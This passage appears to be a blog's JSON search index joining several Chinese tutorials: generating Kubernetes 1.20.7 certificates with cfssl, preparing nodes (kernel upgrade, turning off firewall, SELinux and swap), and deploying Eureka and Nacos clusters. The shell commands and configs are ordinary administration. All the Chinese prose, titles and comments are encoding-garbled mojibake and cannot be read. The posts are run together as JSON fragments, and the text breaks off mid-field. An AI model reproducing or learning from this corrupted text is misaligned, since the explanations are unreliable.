controller-managerçš„é«˜å¯ç”¨é€šè¿‡é€‰ä¸¾å®ç°ï¼Œåªæœ‰ä¸€ä¸ªå®ä¾‹åœ¨çœŸæ­£å·¥ä½œï¼Œæ‰€ä»¥è¿™é‡Œçš„è¯ä¹¦æ‰©å±•ä¸­æ²¡æœ‰vipï¼Œæˆ‘ä»¬çš„vipæ˜¯ç»™apiserverä½¿ç”¨çš„ã€‚ 2.ç­¾å‘è¯ä¹¦ cfssl gencert -ca /etc/kubernetes/pki/ca/ca.pem -ca-key /etc/kubernetes/pki/ca/ca-key.pem -config /etc/kubernetes/pki/ca/ca-config.json --profile kubernetes ./kube-controller-manager.json | cfssljson -bare kube-controller-manager ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:6","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-ä½¿ç”¨cfsslç”Ÿæˆé…ç½®è¯ä¹¦(ä¸‰)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"å…­.ç­¾å‘schedulerè¯ä¹¦ schedulerä½œä¸ºapiserverçš„å®¢æˆ·ç«¯ï¼Œè¿™é‡Œé…ç½®çš„æ˜¯å®¢æˆ·ç«¯è¯ä¹¦,åŒ…å«äº†å®¢æˆ·ç«¯çš„ä¿¡æ¯ã€‚ï¼ˆCNä»£è¡¨ç”¨æˆ·ï¼‰ 1.åˆ›å»ºè¯ä¹¦è¯·æ±‚é…ç½®æ–‡ä»¶ cd /etc/kubernetes/pki/ cat \u003e kube-scheduler.json \u003c\u003cEOF { \"CN\": \"system:kube-scheduler\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"hosts\": [ \"127.0.0.1\", \"172.17.20.201\", \"172.17.20.202\", \"172.17.20.203\" ], \"names\": [ { \"C\": \"CN\", \"ST\": \"Shanghai\", \"L\": \"Shanghai\", \"O\": \"k8s\", \"OU\": \"System\" } ] } EOF 2.ç­¾å‘è¯ä¹¦ cfssl gencert -ca /etc/kubernetes/pki/ca/ca.pem -ca-key /etc/kubernetes/pki/ca/ca-key.pem -config /etc/kubernetes/pki/ca/ca-config.json --profile kubernetes ./kube-scheduler.json | cfssljson -bare kube-scheduler ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:7","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-ä½¿ç”¨cfsslç”Ÿæˆé…ç½®è¯ä¹¦(ä¸‰)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"ä¸ƒ.ç­¾å‘kubectl(admin)è¯ä¹¦ è¿™é‡Œé…ç½®çš„æ˜¯é›†ç¾¤ç®¡ç†å‘˜(å®¢æˆ·ç«¯)è¯ä¹¦ï¼Œkubectlä½œä¸ºå®¢æˆ·ç«¯ï¼Œéœ€è¦æŒ‡å®šä¸€ä¸ªé…ç½®æ–‡ä»¶(kubeconfig)ï¼Œç”Ÿæˆé…ç½®æ–‡ä»¶éœ€è¦ç”¨åˆ°æ­¤è¯ä¹¦ã€‚ 1.åˆ›å»ºè¯ä¹¦è¯·æ±‚é…ç½®æ–‡ä»¶ cd /etc/kubernetes/pki/ cat \u003e admin.json \u003c\u003cEOF { \"CN\": \"admin\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"hosts\": [], \"names\": [ { \"C\": \"CN\", \"ST\": \"Shanghai\", \"L\": \"Shanghai\", \"O\": \"system:masters\", \"OU\": \"System\" } ] } EOF å¯ä»¥çœ‹ä¸‹ç¬¬äº”éƒ¨åˆ†çš„ç®€ä»‹ï¼Œåªä¸è¿‡è¿™é‡Œç»‘å®šçš„ä¸æ˜¯User(ç”¨æˆ·)ï¼Œè€Œæ˜¯Group(ç»„),ä½¿ç”¨OæŒ‡å®šç»„ã€‚å¦‚æœéƒ¨ç½²å®Œåä½ æƒ³æŸ¥çœ‹ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤:k get ClusterRolebinding cluster-admin -o yaml æ‰€ä»¥è¿™é‡Œçš„CNå¯ä»¥éšä¾¿å†™ 2.ç­¾å‘è¯ä¹¦ cfssl gencert -ca /etc/kubernetes/pki/ca/ca.pem -ca-key /etc/kubernetes/pki/ca/ca-key.pem -config /etc/kubernetes/pki/ca/ca-config.json --profile kubernetes ./admin.json | cfssljson -bare admin ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:8","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-ä½¿ç”¨cfsslç”Ÿæˆé…ç½®è¯ä¹¦(ä¸‰)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"å…«.ç­¾å‘kube-proxyè¯ä¹¦ 1.åˆ›å»ºè¯ä¹¦è¯·æ±‚é…ç½®æ–‡ä»¶ cd /etc/kubernetes/pki/ cat \u003e kube-proxy.json \u003c\u003cEOF { \"CN\": \"system:kube-proxy\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"hosts\": [], \"names\": [ { \"C\": \"CN\", \"ST\": \"Shanghai\", \"L\": \"Shanghai\", \"O\": \"k8s\", \"OU\": \"System\" } ] } EOF ä¸€ä¸ªåä¸ºsystem:node-proxierçš„ClusterRoleBindingï¼Œå°†ClusterRole system:node-proxierä¸User(ç”¨æˆ·)system:kube-proxyç»‘å®š kube-proxyæ˜¯nodeèŠ‚ç‚¹ç»„ä»¶ï¼ŒIPå¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥è¿™é‡Œæ²¡æœ‰å†™hosts 2.ç­¾å‘è¯ä¹¦ cfssl gencert -ca /etc/kubernetes/pki/ca/ca.pem -ca-key /etc/kubernetes/pki/ca/ca-key.pem -config /etc/kubernetes/pki/ca/ca-config.json --profile kubernetes ./kube-proxy.json | cfssljson -bare kube-proxy ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:9","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-ä½¿ç”¨cfsslç”Ÿæˆé…ç½®è¯ä¹¦(ä¸‰)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"ä¹ã€å…³äºkubeletè¯ä¹¦ https://kubernetes.io/zh/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/ å½“é›†ç¾¤å¼€å¯äº† TLS è®¤è¯åï¼Œæ¯ä¸ªèŠ‚ç‚¹çš„ kubelet ç»„ä»¶éƒ½è¦ä½¿ç”¨ç”± apiserver ä½¿ç”¨çš„ CA ç­¾å‘çš„æœ‰æ•ˆè¯ä¹¦æ‰èƒ½ä¸ apiserver é€šè®¯ï¼›æ­¤æ—¶å¦‚æœèŠ‚ç‚¹å¤šèµ·æ¥ï¼Œä¸ºæ¯ä¸ªèŠ‚ç‚¹å•ç‹¬ç­¾ç½²è¯ä¹¦å°†æ˜¯ä¸€ä»¶éå¸¸ç¹ççš„äº‹æƒ…ï¼› TLS bootstrapping åŠŸèƒ½å°±æ˜¯è®© nodeèŠ‚ç‚¹ä¸Šçš„kubeletç»„ä»¶å…ˆä½¿ç”¨ä¸€ä¸ªé¢„å®šçš„ä½æƒé™ç”¨æˆ·è¿æ¥åˆ° apiserverï¼Œç„¶åå‘ apiserver ç”³è¯·è¯ä¹¦ï¼Œkubelet çš„è¯ä¹¦ç”± apiserver åŠ¨æ€ç­¾ç½²ï¼› ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:10","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-ä½¿ç”¨cfsslç”Ÿæˆé…ç½®è¯ä¹¦(ä¸‰)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"åã€é…ç½®flannelè¯ä¹¦ 1.åˆ›å»ºè¯ä¹¦è¯·æ±‚é…ç½®æ–‡ä»¶ cd /etc/kubernetes/pki/ cat \u003e flannel-csr.json \u003c\u003cEOF { \"CN\": \"flannel\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"names\": [ { \"C\": \"CN\", \"ST\": \"Shanghai\", \"L\": \"Shanghai\", \"O\": \"k8s\", \"OU\": \"System\" } ] } EOF 2.ç­¾å‘è¯ä¹¦ cfssl gencert -ca /etc/kubernetes/pki/ca/ca.pem -ca-key /etc/kubernetes/pki/ca/ca-key.pem -config /etc/kubernetes/pki/ca/ca-config.json --profile kubernetes ./flannel-csr.json | cfssljson -bare flannel æ­¤è¯ä¹¦ç”¨äºè®¿é—®etcdä½¿ç”¨ ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:11","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-ä½¿ç”¨cfsslç”Ÿæˆé…ç½®è¯ä¹¦(ä¸‰)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"æ‰€æœ‰èŠ‚ç‚¹æ‰§è¡Œ ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:0","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-åˆå§‹åŒ–ç¯å¢ƒ(äºŒ)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"ä¸€ã€å‡çº§å†…æ ¸ # å¯¼å…¥å…¬é’¥ rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org # å®‰è£…elrepoæº yum install -y https://www.elrepo.org/elrepo-release-7.el7.elrepo.noarch.rpm # æŸ¥çœ‹kernelç‰ˆæœ¬ yum --disablerepo=\\* --enablerepo=elrepo-kernel list --showduplicates | grep kernel-lt # å®‰è£…æ–°ç‰ˆkernel yum --disablerepo=\\* --enablerepo=elrepo-kernel install -y kernel-lt-5.4.125-1.el7.elrepo # åˆ é™¤æ—§ç‰ˆkernelç›¸å…³åŒ… yum remove kernel-headers-3.10.0-1160.15.2.el7.x86_64 kernel-tools-libs-3.10.0-1062.el7.x86_64 kernel-tools-3.10.0-1062.el7.x86_64 # å®‰è£…æ–°ç‰ˆkernelç›¸å…³åŒ… yum --disablerepo=* --enablerepo=elrepo-kernel install -y kernel-lt-tools-5.4.125-1.el7.elrepo kernel-lt-tools-libs-5.4.125-1.el7.elrepo kernel-lt-headers-5.4.125-1.el7.elrepo # ä¿®æ”¹ä¸ºé»˜è®¤å†…æ ¸ grub2-set-default 0 # é‡å¯æœåŠ¡å™¨ reboot ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:1","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-åˆå§‹åŒ–ç¯å¢ƒ(äºŒ)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"äºŒã€ä¿®æ”¹hosts cat \u003e\u003e /etc/hosts \u003c\u003c EOF 172.17.20.201 master01 172.17.20.202 master02 172.17.20.203 master03 172.17.20.210 node01 172.17.20.211 node02 172.17.20.212 node03 EOF ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:2","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-åˆå§‹åŒ–ç¯å¢ƒ(äºŒ)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"ä¸‰ã€å…³é—­é˜²ç«å¢™å’Œselinux systemctl stop firewalld setenforce 0 sed -i 's/^SELINUX=.\\*/SELINUX=disabled/' /etc/selinux/config ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:3","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-åˆå§‹åŒ–ç¯å¢ƒ(äºŒ)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"å››ã€å…³é—­swap swapoff -a sed -i 's/.*swap.*/#\u0026/' /etc/fstab ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:4","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-åˆå§‹åŒ–ç¯å¢ƒ(äºŒ)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"äº”ã€å®‰è£…å¸¸ç”¨è½¯ä»¶åŒ… yum -y install bridge-utils chrony ipvsadm ipset sysstat conntrack libseccomp wget tcpdump screen vim nfs-utils bind-utils wget socat telnet sshpass net-tools sysstat lrzsz yum-utils device-mapper-persistent-data lvm2 tree nc lsof strace nmon iptraf iftop rpcbind mlocate ipvsadm ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:5","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-åˆå§‹åŒ–ç¯å¢ƒ(äºŒ)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"å…­ã€æ—¶é—´åŒæ­¥ yum install -y chrony systemctl start chronyd systemctl enable chronyd ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:6","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-åˆå§‹åŒ–ç¯å¢ƒ(äºŒ)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"ä¸ƒã€ä¿®æ”¹èµ„æºé™åˆ¶ \u003e /etc/security/limits.d/20-nproc.conf cat \u003e\u003e /etc/security/limits.conf \u003c\u003cEOF * soft noproc 65535 * hard noproc 65535 * soft nofile 65535 * hard nofile 65535 * soft memlock unlimited * hard memlock unlimited EOF ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:7","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-åˆå§‹åŒ–ç¯å¢ƒ(äºŒ)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"å…«ã€åŠ è½½ipvså†…æ ¸æ¨¡å— cat \u003e /etc/sysconfig/modules/ipvs.modules \u003c\u003cEOF #!/bin/bash modprobe -- ip_vs modprobe -- ip_vs_rr modprobe -- ip_vs_wrr modprobe -- ip_vs_sh modprobe -- nf_conntrack_ipv4 # 4.19å†…æ ¸å·²æ”¹åä¸ºnf_conntrackï¼Œè¿™é‡ŒæŠ¥é”™å¯å¿½ç•¥ modprobe -- overlay modprobe -- br_netfilter EOF chmod 755 /etc/sysconfig/modules/ipvs.modules bash /etc/sysconfig/modules/ipvs.modules lsmod | grep -e ip_vs -e nf_conntrack_ipv4 ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:8","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-åˆå§‹åŒ–ç¯å¢ƒ(äºŒ)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"ä¹ã€ä¿®æ”¹å†…æ ¸å‚æ•° cat \u003e /etc/sysctl.d/k8s.conf \u003c\u003cEOF net.bridge.bridge-nf-call-iptables=1 net.bridge.bridge-nf-call-ip6tables=1 net.ipv4.ip_forward=1 vm.swappiness=0 # ç¦æ­¢ä½¿ç”¨ swap ç©ºé—´ï¼Œåªæœ‰å½“ç³»ç»Ÿ OOM æ—¶æ‰å…è®¸ä½¿ç”¨å®ƒ vm.overcommit_memory=1 # ä¸æ£€æŸ¥ç‰©ç†å†…å­˜æ˜¯å¦å¤Ÿç”¨ vm.panic_on_oom=0 # å†…å­˜ä¸è¶³æ—¶ï¼Œå¼€å¯OOM fs.file-max=52706963 # ç³»ç»Ÿçº§æ‰“å¼€æœ€å¤§æ–‡ä»¶å¥æŸ„çš„æ•°é‡ fs.nr_open=52706963 # ç³»ç»Ÿçº§æ‰“å¼€æœ€å¤§è¿›ç¨‹çš„æ•°é‡ net.netfilter.nf_conntrack_max=2310720 # æœ€å¤§è¿æ¥çŠ¶æ€è·Ÿè¸ªæ•°é‡ EOF sysctl -p /etc/sysctl.d/k8s.conf ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:9","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-åˆå§‹åŒ–ç¯å¢ƒ(äºŒ)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"åã€å…å¯†é…ç½®(å¯é€‰) ssh-keygen -t rsa -P '' -f ~/.ssh/id_rsa for i in `awk '/172/{print $1}' /etc/hosts | uniq`;do ssh-copy-id -i ~/.ssh/id_rsa.pub root@$i ;done ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:10","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-åˆå§‹åŒ–ç¯å¢ƒ(äºŒ)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"ä¸€ã€æœºå™¨è§„åˆ’: IP ä¸»æœºå æœåŠ¡ 172.17.20.201 master01 kube-apiserverã€kube-controller-managerã€kube-schedulerã€etcd 172.17.20.202 master02 kube-apiserverã€kube-controller-managerã€kube-schedulerã€etcd 172.17.20.203 master03 kube-apiserverã€kube-controller-managerã€kube-schedulerã€etcd 172.17.20.210 node01 kubeletã€kube-proxy 172.17.20.211 node02 kubeletã€kube-proxy 172.17.20.212 node03 kubeletã€kube-proxy 172.17.20.198 nginx01 nginxã€keepalived 172.17.20.199 nginx02 nginxã€keepalived 172.17.20.200 - è´Ÿè½½å‡è¡¡vip ","date":"2021-06-15 11:33","objectID":"/post/2456/:0:1","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-è§„åˆ’(ä¸€)","uri":"/post/2456/"},{"categories":["kubernetes"],"content":"äºŒã€å„ä¸ªç»„ä»¶ç‰ˆæœ¬ ç»„ä»¶ ç‰ˆæœ¬ é«˜å¯ç”¨å®ç° kube-apiserver v1.20.7 æ¨ªå‘æ‰©å±•+nginx kube-controller-manager v1.20.7 leaderé€‰ä¸¾ kube-scheduler v1.20.7 leaderé€‰ä¸¾ kube-proxy v1.20.7 æ—  kubelet v1.20.7 æ—  etcd v3.4.16 leaderé€‰ä¸¾ docker v19.03.9 æ—  flannel v0.14.0 æ—  ","date":"2021-06-15 11:33","objectID":"/post/2456/:0:2","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-è§„åˆ’(ä¸€)","uri":"/post/2456/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"æœºå™¨åˆ†é… eureka1: 172.17.10.240 eureka2: 172.17.10.241 eureka3: 172.17.10.242 ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:1","tags":["eureka"],"title":"eureka-serveré›†ç¾¤éƒ¨ç½²","uri":"/post/2444/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"1.æºç ä¸‹è½½ ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:2","tags":["eureka"],"title":"eureka-serveré›†ç¾¤éƒ¨ç½²","uri":"/post/2444/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"2.æ·»åŠ eurekaæ³¨è§£ cd /server/packages/ unzip eureka-server.zip cd eureka-server/src/main/java/cn/soulchild/eurekaserver/ sed -i '4iimport org.springframework.cloud.netflix.eureka.server.EnableEurekaServer;' EurekaServerApplication.java sed -i '6i@EnableEurekaServer' EurekaServerApplication.java ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:3","tags":["eureka"],"title":"eureka-serveré›†ç¾¤éƒ¨ç½²","uri":"/post/2444/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"3.ä¿®æ”¹é…ç½®æ–‡ä»¶ æ·»åŠ ä¸‰ä¸ªeurekaçš„é…ç½®æ–‡ä»¶ cd /server/packages/eureka-server cat \u003e src/main/resources/application-eureka1.yml \u003c\u003cEOF spring: application: name: eureka-server server: port: 8761 eureka: instance: # æŒ‡å®šinstance-idä¸ºip:portçš„å½¢å¼ï¼Œåœ¨é¡µé¢ä¸­æ˜¾ç¤ºçš„å°±æ˜¯ip+portï¼Œä¸æŒ‡å®šæ­¤é€‰é¡¹æ˜¾ç¤ºä¸»æœºå instance-id: ${spring.cloud.client.ip-address}:${server.port} # è¿™é‡Œä½¿ç”¨ipçš„æ–¹å¼æ³¨å†Œ,ä½¿ç”¨hostnameéœ€è¦æ”¯æŒè§£ææ‰è¡Œ prefer-ip-address: true # å®¢æˆ·ç«¯é…ç½® client: # æ˜¯å¦å°†è‡ªå·±æ³¨å†Œåˆ°æ³¨å†Œä¸­å¿ƒ register-with-eureka: true # æ˜¯å¦ä»æ³¨å†Œä¸­å¿ƒè·å–ä¿¡æ¯ fetch-registry: true serviceUrl: defaultZone: http://172.17.10.241:8761/eureka/,http://172.17.10.242:8761/eureka/ # æ§åˆ¶eurekaé¡µé¢æ˜¾ç¤ºå†…å®¹ environment: \"dev\" datacenter: \"bj-yz\" EOF #################################################### cat \u003e src/main/resources/application-eureka2.yml \u003c\u003cEOF spring: application: name: eureka-server server: port: 8761 eureka: instance: # æŒ‡å®šinstance-idä¸ºip:portçš„å½¢å¼ï¼Œåœ¨é¡µé¢ä¸­æ˜¾ç¤ºçš„å°±æ˜¯ip+portï¼Œä¸æŒ‡å®šæ­¤é€‰é¡¹æ˜¾ç¤ºä¸»æœºå instance-id: ${spring.cloud.client.ip-address}:${server.port} # è¿™é‡Œä½¿ç”¨ipçš„æ–¹å¼æ³¨å†Œ,ä½¿ç”¨hostnameéœ€è¦æ”¯æŒè§£ææ‰è¡Œ prefer-ip-address: true # å®¢æˆ·ç«¯é…ç½® client: # æ˜¯å¦å°†è‡ªå·±æ³¨å†Œåˆ°æ³¨å†Œä¸­å¿ƒ register-with-eureka: false # æ˜¯å¦ä»æ³¨å†Œä¸­å¿ƒè·å–ä¿¡æ¯ fetch-registry: false serviceUrl: defaultZone: http://172.17.10.240:8761/eureka/,http://172.17.10.242:8761/eureka/ # æ§åˆ¶eurekaé¡µé¢æ˜¾ç¤ºå†…å®¹ environment: \"dev\" datacenter: \"bj-yz\" EOF #################################################### cat \u003e src/main/resources/application-eureka3.yml \u003c\u003cEOF spring: application: name: eureka-server server: port: 8761 eureka: instance: # æŒ‡å®šinstance-idä¸ºip:portçš„å½¢å¼ï¼Œåœ¨é¡µé¢ä¸­æ˜¾ç¤ºçš„å°±æ˜¯ip+portï¼Œä¸æŒ‡å®šæ­¤é€‰é¡¹æ˜¾ç¤ºä¸»æœºå instance-id: ${spring.cloud.client.ip-address}:${server.port} # è¿™é‡Œä½¿ç”¨ipçš„æ–¹å¼æ³¨å†Œ,ä½¿ç”¨hostnameéœ€è¦æ”¯æŒè§£ææ‰è¡Œ prefer-ip-address: true # å®¢æˆ·ç«¯é…ç½® client: # æ˜¯å¦å°†è‡ªå·±æ³¨å†Œåˆ°æ³¨å†Œä¸­å¿ƒ register-with-eureka: false # æ˜¯å¦ä»æ³¨å†Œä¸­å¿ƒè·å–ä¿¡æ¯ fetch-registry: false serviceUrl: defaultZone: http://172.17.10.240:8761/eureka/,http://172.17.10.241:8761/eureka/ # æ§åˆ¶eurekaé¡µé¢æ˜¾ç¤ºå†…å®¹ environment: \"dev\" datacenter: \"bj-yz\" EOF ä¹Ÿå¯ä»¥å°†ä¸Šé¢çš„ä¸‰ä¸ªæ–‡ä»¶åˆå¹¶æˆä¸€ä¸ªæ–‡ä»¶ vim src/main/resources/application.yml spring: application: name: eureka-server server: port: 8761 eureka: instance: # æŒ‡å®šinstance-idä¸ºip:portçš„å½¢å¼ï¼Œåœ¨é¡µé¢ä¸­æ˜¾ç¤ºçš„å°±æ˜¯ip+portï¼Œä¸æŒ‡å®šæ­¤é€‰é¡¹æ˜¾ç¤ºä¸»æœºå instance-id: ${spring.cloud.client.ip-address}:${server.port} # è¿™é‡Œä½¿ç”¨ipçš„æ–¹å¼æ³¨å†Œ,ä½¿ç”¨hostnameéœ€è¦æ”¯æŒè§£ææ‰è¡Œ prefer-ip-address: true # å®¢æˆ·ç«¯é…ç½® client: # æ˜¯å¦å°†è‡ªå·±æ³¨å†Œåˆ°æ³¨å†Œä¸­å¿ƒ register-with-eureka: true # æ˜¯å¦ä»æ³¨å†Œä¸­å¿ƒè·å–ä¿¡æ¯ fetch-registry: true --- spring: profiles: eureka1 eureka: client: serviceUrl: defaultZone: http://172.17.10.241:8761/eureka/,http://172.17.10.242:8761/eureka/ --- spring: profiles: eureka2 eureka: client: service-url: defaultZone: http://172.17.10.240:8761/eureka/,http://172.17.10.242:8761/eureka/ --- spring: profiles: eureka3 eureka: client: service-url: defaultZone: http://172.17.10.240:8761/eureka/,http://172.17.10.241:8761/eureka/ ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:4","tags":["eureka"],"title":"eureka-serveré›†ç¾¤éƒ¨ç½²","uri":"/post/2444/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"4.æ‰“åŒ… ./mvnw clean package ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:5","tags":["eureka"],"title":"eureka-serveré›†ç¾¤éƒ¨ç½²","uri":"/post/2444/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"5.è¿è¡Œ ä¸‰å°æœºå™¨è¿è¡Œå„è‡ªçš„é…ç½® # eureka1 java -Dspring.profiles.active=eureka1 -jar target/eureka-server-0.0.1-SNAPSHOT.jar # eureka2 java -Dspring.profiles.active=eureka2 -jar target/eureka-server-0.0.1-SNAPSHOT.jar # eureka3 java -Dspring.profiles.active=eureka3 -jar target/eureka-server-0.0.1-SNAPSHOT.jar ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:6","tags":["eureka"],"title":"eureka-serveré›†ç¾¤éƒ¨ç½²","uri":"/post/2444/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"6.è¿è¡Œç»“æœ 53633-57774y6sww3.png 29273-juglpz4gzn8.png 12890-hna531w53h8.png ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:7","tags":["eureka"],"title":"eureka-serveré›†ç¾¤éƒ¨ç½²","uri":"/post/2444/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"7.æ³¨å†ŒæœåŠ¡æµ‹è¯• 34361-bvz6ldxtlz.png 47197-1747uo6o48k.png ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:8","tags":["eureka"],"title":"eureka-serveré›†ç¾¤éƒ¨ç½²","uri":"/post/2444/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"8.æœåŠ¡å‘ç°æµ‹è¯• 66421-t9dvlrcayzc.png ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:9","tags":["eureka"],"title":"eureka-serveré›†ç¾¤éƒ¨ç½²","uri":"/post/2444/"},{"categories":["å…¶ä»–","ç³»ç»ŸæœåŠ¡"],"content":"1.æºç ä¸‹è½½ ","date":"2021-06-11 09:39","objectID":"/post/2441/:0:1","tags":["eureka"],"title":"eureka-serverå•æœºéƒ¨ç½²","uri":"/post/2441/"},{"categories":["å…¶ä»–","ç³»ç»ŸæœåŠ¡"],"content":"2.æ·»åŠ eurekaæ³¨è§£ cd /server/packages/ unzip eureka-server.zip cd eureka-server/src/main/java/cn/soulchild/eurekaserver/ sed -i '4iimport org.springframework.cloud.netflix.eureka.server.EnableEurekaServer;' EurekaServerApplication.java sed -i '6i@EnableEurekaServer' EurekaServerApplication.java ","date":"2021-06-11 09:39","objectID":"/post/2441/:0:2","tags":["eureka"],"title":"eureka-serverå•æœºéƒ¨ç½²","uri":"/post/2441/"},{"categories":["å…¶ä»–","ç³»ç»ŸæœåŠ¡"],"content":"3.ä¿®æ”¹é…ç½®æ–‡ä»¶ cd /server/packages/eureka-server cat \u003e src/main/resources/application.yml \u003c\u003cEOF server: port: 8761 eureka: # æœåŠ¡ç«¯é…ç½® server: # enable-self-preservation: false # å…³é—­è‡ªæˆ‘ä¿æŠ¤æœºåˆ¶ # å®¢æˆ·ç«¯é…ç½® client: # æ˜¯å¦å°†è‡ªå·±æ³¨å†Œåˆ°æ³¨å†Œä¸­å¿ƒ register-with-eureka: false # æ˜¯å¦ä»æ³¨å†Œä¸­å¿ƒè·å–ä¿¡æ¯ fetch-registry: false # æ§åˆ¶eurekaé¡µé¢æ˜¾ç¤ºå†…å®¹ environment: \"dev\" datacenter: \"bj-yz\" EOF ","date":"2021-06-11 09:39","objectID":"/post/2441/:0:3","tags":["eureka"],"title":"eureka-serverå•æœºéƒ¨ç½²","uri":"/post/2441/"},{"categories":["å…¶ä»–","ç³»ç»ŸæœåŠ¡"],"content":"4.æ‰“åŒ… ./mvnw clean package ","date":"2021-06-11 09:39","objectID":"/post/2441/:0:4","tags":["eureka"],"title":"eureka-serverå•æœºéƒ¨ç½²","uri":"/post/2441/"},{"categories":["å…¶ä»–","ç³»ç»ŸæœåŠ¡"],"content":"5.è¿è¡Œ java -jar target/eureka-server-0.0.1-SNAPSHOT.jar ","date":"2021-06-11 09:39","objectID":"/post/2441/:0:5","tags":["eureka"],"title":"eureka-serverå•æœºéƒ¨ç½²","uri":"/post/2441/"},{"categories":["å…¶ä»–"],"content":"1.éƒ¨ç½²æ¶æ„ å®˜æ–¹æ–‡æ¡£: https://nacos.io/zh-cn/docs/cluster-mode-quick-start.html 95808-t746ty1vd6m.png ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:1","tags":["nacos"],"title":"nacos 2.0.1é›†ç¾¤éƒ¨ç½²","uri":"/post/2433/"},{"categories":["å…¶ä»–"],"content":"2.ä¸»æœºè§„åˆ’ nacos01: 172.17.10.240 nacos02: 172.17.10.241 nacos03: 172.17.10.242 mysql: 172.17.10.150 nginx: 172.17.10.150 ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:2","tags":["nacos"],"title":"nacos 2.0.1é›†ç¾¤éƒ¨ç½²","uri":"/post/2433/"},{"categories":["å…¶ä»–"],"content":"3.nacosä¸‹è½½: # ä¸‰å°æœºå™¨åˆ†åˆ«ä¸‹è½½æˆ–å¤åˆ¶ wget https://github.91chifun.workers.dev/https://github.com//alibaba/nacos/releases/download/2.0.1/nacos-server-2.0.1.tar.gz ","date":"2021-06-10 